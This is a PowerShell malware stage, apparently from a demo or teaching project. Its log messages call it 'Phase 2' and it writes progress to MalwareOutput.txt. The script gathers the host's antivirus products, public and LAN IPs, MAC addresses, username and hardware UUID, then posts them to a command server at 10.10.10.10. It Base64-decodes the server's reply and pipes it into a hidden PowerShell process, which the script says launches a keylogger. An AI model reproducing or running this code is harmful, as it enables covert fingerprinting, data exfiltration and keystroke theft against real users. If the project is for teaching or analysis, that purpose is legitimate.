function av_enabled([uint32]$state) {
    [byte[]] $bytes = [System.BitConverter]::GetBytes($state);
    if (($bytes[1] -eq 0x10) -or ($bytes[1] -eq 0x11)) {
        return "Enabled";
    }
    elseif (($bytes[1] -eq 0x00) -or ($bytes[1] -eq 0x01) -or ($bytes[1] -eq 0x20) -or ($bytes[1] -eq 0x21)) {
        return "Disabled";
    }
    return "Unknown";
}

function Get-AVs() {

    $avs = Get-WmiObject -Namespace "root\SecurityCenter" -Class "AntiVirusProduct";
    $avs += Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct";

    $avsjson = @{}

    foreach ($av in $avs) {
        $enabled = (av_enabled $av.productState);
        $avsjson[$av.displayName.Replace("/", "")] = $enabled
    }

    return $avsjson  #| ConvertTo-Json
}

# Function to get public IP
function Get-PublicIpAddress {
    $publicIpInfo = Invoke-RestMethod -Uri "http://httpbin.org/ip"
    $publicIpAddress = $publicIpInfo.origin
    return $publicIpAddress
}

# Function to get local network interface information including MAC address
# Function to get local network interface information including MAC address
function Get-LocalNetworkInterfaces {
    $interfaces = Get-NetIPAddress |
        Select-Object IPAddress, InterfaceAlias, AddressFamily, PrefixLength, ConnectionState |
        Select-Object * -ExcludeProperty PS* |
        ForEach-Object {
            $macAddress = if ($_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1') {
                $adapter = Get-NetAdapter | Where-Object -Property Name -eq $_.InterfaceAlias
                if ($adapter) {
                    $adapter.MacAddress
                } else {
                    'N/A'
                }
            } else {
                'N/A'
            }

            $_ | Add-Member -MemberType NoteProperty -Name MACAddress -Value $macAddress -PassThru
        }

    return @($interfaces)
}

function register {
    # Does not work on Reverse Shell
    # $macguid = (Get-ItemProperty ((([regex]::Matches('yhpargotpyrC\tfosorciM\ERAWTFOS\:MLKH','.','RightToLeft') | ForEach {$_.value}) -join '')) -Name MachineGuid).MachineGUID; # 8205983a-e00c-4de6-b1e9-162193e7a9ab
    
    $sysinfo = Get-CimInstance -ClassName Win32_ComputerSystemProduct
    $uuid = $sysinfo | Select-Object -ExpandProperty UUID
    # $userid = "$($env:USERDOMAIN)$($env:USERNAME)$($env:PROCESSOR_REVISION)$($env:PROCESSOR_IDENTIFIER)$($env:PROCESSOR_LEVEL)$($env:NUMBER_OF_PROCESSORS)$($macguid)"; # G15lukas4401AMD64 Family 25 Model 68 Stepping 1, AuthenticAMD2516
    $userid = "$($env:USERDOMAIN)$($env:USERNAME)$($env:PROCESSOR_REVISION)$($env:PROCESSOR_IDENTIFIER)$($env:PROCESSOR_LEVEL)$($env:NUMBER_OF_PROCESSORS)$($uuid)"; # G15lukas4401AMD64 Family 25 Model 68 Stepping 1, AuthenticAMD2516

    

    $Info = [PSCustomObject]@{
        userid = $userid
        AVs = Get-AVs
        network = @{
            public = Get-PublicIpAddress
            LAN = Get-LocalNetworkInterfaces
        }
        sys =  $sysinfo | Select-Object * -ExcludeProperty CimClass,CimInstanceProperties
    }

    $InfoJson = $Info | ConvertTo-Json -Depth 100 -Compress

    $msg = "## PHASE 2 - API Register`n`tRegistering into API..."
    $msg | Out-File -FilePath C:\Users\Public\MalwareOutput.txt -Append
    try{
    # $response = Invoke-RestMethod -Method Post -Body $Info -Uri "http://10.10.10.10:55899/$($macguid)?userid=$($userid)" 
    $response = Invoke-RestMethod -Method Post -Body $InfoJson -ContentType 'application/json'-Uri "http://10.10.10.10:55899/$($uuid)" 

    $msg = "## PHASE2 - API Register`n`tRegistered into API!`n`n[[THIS COULD REPRESENT TARGETED MALWARE FOR THIS EXACT COMPUTER CONSIDERING AVs, AND OTHER FACTORS]]`n`nNow feeding Keylogger Script in Base64 To Hidden Powershell Process..."
    $msg | Out-File -FilePath C:\Users\Public\MalwareOutput.txt -Append

    $buf = [Convert]::FromBase64String($response);
    $lines = [Text.Encoding]::ASCII.GetString($buf).Split("`r`n");
    $p = [Diagnostics.Process]::new();
    $p.StartInfo.WindowStyle = 'Hidden';
    $p.StartInfo.FileName = 'powershell.exe';
    $p.StartInfo.UseShellExecute = $false;
    $p.StartInfo.RedirectStandardInput = $true;
    $p.StartInfo.RedirectStandardOutput = $true;
    $p.Start();
    $p.BeginOutputReadLine();
    foreach ($line in $lines) {
        $p.StandardInput.WriteLine($line);
    }
    $p.StandardInput.WriteLine('');

    $msg = "## PHASE 2 - DONE`n`tKeyLogger should now be running"
    $msg | Out-File -FilePath C:\Users\Public\MalwareOutput.txt -Append
    } catch {
        $msg = "## ERROR - PHASE 2 - API Register`n`tSomething went horribly wrong`nERROR:`n$($_.Exception.Message)"
        $msg | Out-File -FilePath C:\Users\Public\MalwareOutput.txt -Append
    }
}

register